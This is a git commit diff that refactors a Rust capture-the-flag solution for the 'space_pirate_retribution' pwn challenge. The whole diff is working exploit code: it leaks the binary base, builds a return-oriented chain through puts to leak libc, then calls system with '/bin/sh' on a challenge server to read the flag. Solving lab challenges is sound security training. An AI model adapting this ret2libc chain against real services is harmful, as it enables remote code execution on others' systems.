a04e53710ab247211fa0e587b1a3f16954fe5a5b
JPaja <jovan.pavlovic99@gmail.com>
2024-01-25 00:05:14 +0100

    Update retribution writeup

--- pwn/space_pirate_retribution/src/main.rs
+++ pwn/space_pirate_retribution/src/main.rs
@@ -5,8 +5,20 @@ use ctf_pwn::unix::*;
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    loop{
+    let elf = Elf::parse("sp_retribution").await?;
+    let puts_got = *elf.got().get("puts").unwrap();
+    let puts_plt = *elf.plt().get("puts").unwrap();
+    let main = elf.symbols().get("main").unwrap().value;
 
+    let pop_rdi = 0xd33;
+    let ret = 0x746;
+
+    let libc_elf = Elf::parse("glibc/libc.so.6").await?;
+    let libc_puts = libc_elf.dynamic_symbols().get("puts").unwrap().value;
+    let system = libc_elf.dynamic_symbols().get("system").unwrap().value;
+    let bin_sh = 0x18ce57;
+
+    loop {
         let mut pipe = TcpPipe::connect("123.123.123.123:1337").await?;
 
         let payload_base = Payload::builder()
@@ -19,8 +31,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             .send()
             .recv_until(", y = ", false)
             .recv_until("\n[*]", true);
-    
-        let payload = payload_base.clone()
+
+        let payload = payload_base
+            .clone()
             .convert(|leak| {
                 let mut buf = [0u8; 8];
                 buf[..usize::min(8, leak.len())].copy_from_slice(&leak);
@@ -28,71 +41,46 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 base_leak & 0xFFFu64.not()
             })
             .condition(|&leak| leak > 0x1000000)
-            //.print_lower_hex()
-            .build();
-    
-        let leak = match pipe.payload(payload).await
-        {
-            Ok(leak) => leak,
-            Err(PipeError::ConditionFailed) => continue,
-            Err(e) => return Err(e.into()),
-        };
-        
-        println!("Base leak: {leak}");
-    
-        let pop_rdi = leak + 0xd33;
-        let ret = leak + 0x746;
-    
-        let elf = Elf::parse("sp_retribution").await?;
-        let puts_got = leak + *elf.got().get("puts").unwrap();
-        let puts_plt = leak + *elf.plt().get("puts").unwrap();
-        let main = leak + elf.symbols().get("main").unwrap().value;
-    
-        let payload = Payload::builder()
-            .x64()
-            .recv_until_utf8("Verify new coordinates? (y/n): ", false)
-            .fill("A", 0x58)
-            .push_ptr(pop_rdi)
-            .push_ptr(puts_got)
-            .push_ptr(puts_plt)
-            .push_ptr(main)
-            .send()
-            .recv_until("\x1B[1;34m\n", false)
-            .recv_line()
-            .convert(|leak| {
-                let mut buf = [0u8; 8];
-                buf[..usize::min(8, leak.len())].copy_from_slice(&leak);
-                let leak = u64::from_le_bytes(buf);
-                leak
+            .payload(|base_leak| {
+                println!("Base leak: {base_leak}");
+                Payload::builder()
+                    .x64()
+                    .recv_until_utf8("Verify new coordinates? (y/n): ", false)
+                    .fill("A", 0x58)
+                    .push_ptr(base_leak + pop_rdi)
+                    .push_ptr(base_leak + puts_got)
+                    .push_ptr(base_leak + puts_plt)
+                    .push_ptr(base_leak + main)
+                    .send()
+                    .recv_until("\x1B[1;34m\n", false)
+                    .recv_line()
+                    .convert(|leak| {
+                        let mut buf = [0u8; 8];
+                        buf[..usize::min(8, leak.len())].copy_from_slice(&leak);
+                        let leak = u64::from_le_bytes(buf);
+                        leak - libc_puts
+                    })
+                    .condition(|&leak| leak > 0x1000000)
+                    .convert(move |libc_leak| (base_leak, libc_leak))
+                    .build()
             })
-            //.print_lower_hex()
-            .condition(|&leak| leak > 0x1000000)
             .build();
-    
-        let libc_elf =
-            Elf::parse("glibc/libc.so.6").await?;
-    
-        let libc_leak = match pipe.payload(payload).await
-        {
+
+        let (base_leak, libc_leak) = match pipe.payload(payload).await {
             Ok(value) => value,
             Err(PipeError::ConditionFailed) => continue,
             Err(e) => return Err(e.into()),
         };
 
-        let libc_leak = libc_leak - libc_elf.dynamic_symbols().get("puts").unwrap().value;
-    
         println!("Libc leak: {libc_leak:x}");
-    
-        let bin_sh = libc_leak + 0x18ce57;
-        let system = libc_leak + libc_elf.dynamic_symbols().get("system").unwrap().value;
-    
-        let payload = payload_base.clone()
+        let payload = payload_base
+            .clone()
             .recv_until("Verify new coordinates? (y/n): ", true)
             .fill("A", 0x58)
-            .push_ptr(ret)
-            .push_ptr(pop_rdi)
-            .push_ptr(bin_sh)
-            .push_ptr(system)
+            .push_ptr(base_leak + ret)
+            .push_ptr(base_leak + pop_rdi)
+            .push_ptr(libc_leak + bin_sh)
+            .push_ptr(libc_leak + system)
             .send()
             .recv_until("Coordinates have been reset!", true)
             .recv_line()
@@ -100,14 +88,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             .send()
             .recv_line_utf8()
             .build();
-    
-    
-        let flag = match pipe.payload(payload).await
-        {
+
+        let flag = match pipe.payload(payload).await {
             Ok(value) => value,
             Err(PipeError::ConditionFailed) => continue,
             Err(e) => return Err(e.into()),
         };
+
         println!("Flag: {flag}");
         break;
     }
